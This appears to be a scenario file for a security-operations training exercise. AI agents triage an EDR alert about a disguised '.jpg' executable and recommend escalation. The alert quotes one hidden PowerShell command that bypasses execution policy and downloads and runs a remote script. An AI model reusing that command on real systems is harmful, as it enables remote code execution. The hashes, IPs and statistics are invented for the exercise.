scenario.title: The Suspicious Puppy
scenario.description: A critical alert has fired on a Sales Director's workstation. Deploy your Wise Agents to connect the dots.

initialAlert.title: WINDOWS METHODOLOGY [Powershell DownloadFile]
initialAlert.rawDetails:
Alert ID: EDR-2024-02-11-87634
Source: Endpoint Detection & Response (EDR)
Rule: Suspicious PowerShell Download Activity
User: david.squiller@company.com
Hostname: dsquiller-finance-pc
IP Address: 10.42.158.73
OS: Windows 10 Enterprise (Build 19045)
Domain: CORP\dsquiller

Process Tree:
└─ explorer.exe (PID: 4892)
   └─ 19625_cutepuppyjpg.exe (PID: 7341)
      └─ powershell.exe (PID: 8156)
         • Command Line: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/malicious-repo/payload/main/stage2.ps1')"
         • Working Directory: C:\Users\dsquiller\Downloads
         • Parent Image: C:\Users\dsquiller\Downloads\19625_cutepuppyjpg.exe
         • File Hash (SHA256): 3a7b4f2c9d8e1f0a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a

Key Indicators:
• File extension masquerading (.exe disguised as .jpg)
• PowerShell execution policy bypass
• Hidden window style (-WindowStyle Hidden)
• Remote script download from GitHub
• No digital signature on parent executable
• First-time file execution on this endpoint

Network Activity:
• Outbound HTTPS to raw.githubusercontent.com (Port 443)
• DNS Query: raw.githubusercontent.com → 185.199.108.133
• Connection established at 14:23:42 UTC
• Total data transferred: 47.3 KB downloaded

Risk Factors:
⚠️ Execution from user Downloads folder
⚠️ Unsigned executable with suspicious naming
⚠️ PowerShell download pattern common in malware campaigns
⚠️ User has access to sensitive Sales and Finance data
⚠️ No prior PowerShell usage history for this user

Recommendation: Investigate immediately to determine if this is malicious activity or legitimate business process.

EDR.text: A file named '19625_cutepuppyjpg.exe' (masquerading as a JPG image) executed PowerShell with bypassed execution policy to download and execute a script from GitHub. This is a common malware delivery technique.
transparencySteps: [Wise] Querying EDR for process creation events on dsquiller-finance-pc...
[Wise] Found parent process: 19625_cutepuppyjpg.exe
[Wise] Analyzing child process: powershell.exe with -ExecutionPolicy Bypass flag
[Wise] Decoding command line arguments...
[Wise] Detected download from raw.githubusercontent.com
[Wise] Assessment: File extension masquerading detected (.exe posing as .jpg)

NDR.text: Network traffic logs show HTTPS connections from dsquiller-finance-pc, but without endpoint context, I cannot determine if this is malicious or routine browsing activity.
NDR.hint: Consider using the EDR Agent for endpoint process-related questions.
transparencySteps: [Wise] Querying NDR for network traffic from dsquiller-finance-pc...
[Wise] Found HTTPS connections to github.com domain
[Wise] Unable to inspect encrypted traffic content
[Wise] Warning: Network data alone insufficient for process-level analysis

Identity.text: David Squiller is authenticated and has standard user permissions. No authentication anomalies detected, but this doesn't explain the process behavior.
Identity.hint: Consider using the EDR Agent for endpoint process-related questions.
transparencySteps: [Wise] Querying Identity system for user: david.squiller...
[Wise] User authentication status: Active
[Wise] No failed login attempts detected
[Wise] Warning: Identity data cannot determine process-level activity

IVX.text: File sandboxing requires the sample to be submitted. No sandbox analysis available for this file yet.
IVX.hint: Consider using the EDR Agent for endpoint process-related questions.
transparencySteps: [Wise] Checking IVX sandbox for file: 19625_cutepuppyjpg.exe...
[Wise] No existing analysis found
[Wise] File not yet submitted to sandbox environment
[Wise] Would you like to queue this file for detonation?

questions.text: Who is this user and are they a high-value target?

Identity.text: David Squiller is a Director in the Sales department. While not marked as a VIP or superuser, his director-level position makes him a potentially valuable target for attackers seeking sales data or customer information.
transparencySteps: [Wise] Querying Identity system for user profile: david.squiller...
[Wise] Found: David Squiller
[Wise] Title: Director
[Wise] Department: Sales
[Wise] VIP Status: No
[Wise] Superuser/Admin: No
[Wise] Analyzing user access patterns over 90-day lookback period...
[Wise] Assessment: Director-level access to sensitive sales and customer data

EDR.text: EDR logs show this is the local user 'dsquiller' on the endpoint, but EDR doesn't have organizational hierarchy or role information.
EDR.hint: Consider using the Identity Agent for user profile and role questions.
transparencySteps: [Wise] Querying EDR for user information...
[Wise] Local username: dsquiller
[Wise] Warning: EDR lacks organizational context and user role data

NDR.text: Network logs show traffic from dsquiller-finance-pc but don't contain user role or organizational hierarchy information.
NDR.hint: Consider using the Identity Agent for user profile and role questions.
transparencySteps: [Wise] Querying NDR for source host information...
[Wise] Hostname: dsquiller-finance-pc
[Wise] Warning: Network data does not include user role information

IVX.text: IVX analyzes file behavior, not user profiles. Unable to determine user importance from sandbox data.
IVX.hint: Consider using the Identity Agent for user profile and role questions.
transparencySteps: [Wise] IVX sandbox focuses on file behavior analysis
[Wise] User organizational context not available in this data source

questions.text: Is this tool usage normal for this user's role?

EDR.text: No. Sales Directors do not typically run PowerShell scripts, especially with execution policy bypasses to download code from the internet. This behavior is highly anomalous for this user's role.
transparencySteps: [Wise] Analyzing historical PowerShell usage for david.squiller...
[Wise] Checking behavioral baseline for Sales department...
[Wise] Historical data: 0 PowerShell executions in last 90 days
[Wise] Department norm: Sales users average 0.1 PowerShell events per month
[Wise] IT/Admin users average: 45 PowerShell events per month
[Wise] Assessment: This activity is highly unusual for this user profile

Identity.text: Based on role information, Sales Directors typically use business applications like Salesforce, email, and Office tools. PowerShell scripting would be unusual, but I need EDR context to confirm actual tool usage.
Identity.hint: The Identity Agent knows roles, but the EDR Agent can analyze actual tool usage patterns.
transparencySteps: [Wise] Reviewing standard tools for Sales department...
[Wise] Expected tools: Salesforce, Microsoft Office, Email clients
[Wise] PowerShell typically authorized for: IT, DevOps, System Admins
[Wise] Warning: Cannot confirm actual usage without endpoint data

NDR.text: Network traffic shows HTTPS connections, which is normal for any user role. Cannot determine application-level tool usage from network data alone.
NDR.hint: Consider using the EDR Agent to analyze tool usage and process execution patterns.
transparencySteps: [Wise] Analyzing network traffic patterns...
[Wise] HTTPS connections detected (standard for all roles)
[Wise] Warning: Cannot determine specific application usage from encrypted traffic

IVX.text: IVX determines file maliciousness, not whether tool usage aligns with user roles.
IVX.hint: Consider using the EDR Agent to analyze tool usage and process execution patterns.
transparencySteps: [Wise] IVX sandbox analyzes file behavior, not user role alignment
[Wise] Recommend using EDR for behavioral baseline analysis

IVX.text: Yes. Sandbox analysis reveals the downloaded script contains a credential stealer targeting browser passwords, cryptocurrency wallets, and establishes a reverse shell connection to a known C2 server.
transparencySteps: [Wise] Submitting file to IVX sandbox for detonation...
[Wise] Executing script in isolated environment...
[Wise] Detected behavior: File system enumeration for browser data
[Wise] Detected behavior: Registry access to credential stores
[Wise] Detected behavior: Outbound connection attempt to 178.23.145.92:4444
[Wise] Cross-referencing with threat intelligence...
[Wise] IP 178.23.145.92 identified as known C2 infrastructure
[Wise] Verdict: Malicious - Credential theft and C2 communication

EDR.text: EDR shows the file executed suspicious commands, but without sandbox analysis, I cannot definitively confirm malicious payload behavior or C2 communication attempts.
EDR.hint: The IVX Agent specializes in file sandboxing and maliciousness determination.
transparencySteps: [Wise] Analyzing EDR telemetry for child processes...
[Wise] Suspicious indicators: Execution policy bypass, remote script download
[Wise] Warning: EDR cannot detonate files in isolated environment
[Wise] Recommend: IVX sandbox analysis for definitive verdict

NDR.text: Network logs show the endpoint connected to an external IP with suspicious reputation, but without file analysis, cannot confirm the payload's intent.
NDR.hint: The IVX Agent specializes in file sandboxing and maliciousness determination.
transparencySteps: [Wise] Analyzing network connections from dsquiller-finance-pc...
[Wise] Found connection to 178.23.145.92 (Germany)
[Wise] Threat intelligence: IP has medium reputation score
[Wise] Warning: Network data insufficient for file verdict

Identity.text: Identity systems track users and access, not file maliciousness. Unable to analyze file content.
Identity.hint: The IVX Agent specializes in file sandboxing and maliciousness determination.
transparencySteps: [Wise] Identity system does not perform file analysis
[Wise] Recommend: IVX Agent for malware analysis

questions.text: What did this endpoint do on the network after infection?

NDR.text: The endpoint established a connection to 178.23.145.92:4444, a confirmed Tor exit node in Gunzenhausen, Germany. This IP has generated 304 brute force attempts across your network in the last 24 hours, indicating a coordinated attack campaign.
transparencySteps: [Wise] Querying NDR for post-infection network activity...
[Wise] Found outbound connection to 178.23.145.92:4444
[Wise] Performing geolocation lookup...
[Wise] Location: Gunzenhausen, Germany
[Wise] Cross-referencing with Tor exit node database...
[Wise] Confirmed: IP is active Tor exit node
[Wise] Correlating with other alerts for this IP...
[Wise] Found: 304 brute force attempts, 33 password spray events in last 24 hours
[Wise] Assessment: Part of larger coordinated attack campaign

EDR.text: EDR shows the PowerShell process initiated network connections, but endpoint telemetry lacks full network context like geolocation, connection timing, and traffic correlation across multiple hosts.
EDR.hint: The NDR Agent specializes in network traffic analysis and lateral movement detection.
transparencySteps: [Wise] Checking EDR for network connection events...
[Wise] PowerShell process initiated outbound connections
[Wise] Warning: EDR has limited network traffic visibility
[Wise] Recommend: NDR Agent for comprehensive network analysis

IVX.text: Sandbox analysis showed the malware attempts C2 communication, but the sandboxed network is isolated. NDR is needed for actual network traffic in your production environment.
IVX.hint: The NDR Agent specializes in network traffic analysis and lateral movement detection.
transparencySteps: [Wise] Reviewing sandbox network behavior...
[Wise] Detected attempted connection to C2 server in sandbox
[Wise] Warning: Sandbox uses isolated network environment
[Wise] Cannot observe actual production network traffic from IVX

Identity.text: Identity logs track authentication and access, not network traffic or C2 communication.
Identity.hint: The NDR Agent specializes in network traffic analysis and lateral movement detection.
transparencySteps: [Wise] Identity system does not monitor network traffic
[Wise] Recommend: NDR Agent for network activity analysis

questions.text: Should we escalate this alert to Critical?

WISE.text: YES - ESCALATE TO CRITICAL. The evidence is irrefutable: (1) File masquerading as image executed malicious PowerShell, (2) Director-level user targeted (access to sensitive sales data), (3) Anomalous tool usage for role, (4) Confirmed malware with credential theft capability, (5) C2 communication to Tor node linked to 304+ brute force attempts. This is an active compromise requiring immediate remediation.
remediationActions: Disable Active Directory account for david.squiller
Force password reset with MFA re-enrollment
Notify Sales leadership and IR team
transparencySteps: [Wise] Synthesizing all investigation findings...
[Wise] Attack vector: Phishing/Social Engineering → File Masquerading
[Wise] Target value: Director-level user with sales data access
[Wise] Behavioral anomaly: PowerShell usage unprecedented for this role
[Wise] Malware capability: Credential theft + C2 communication
[Wise] Network indicator: Connection to Tor node with 304 brute force events
[Wise] Correlation complete: This matches APT credential harvesting patterns
[Wise] RECOMMENDATION: Immediate escalation and containment required
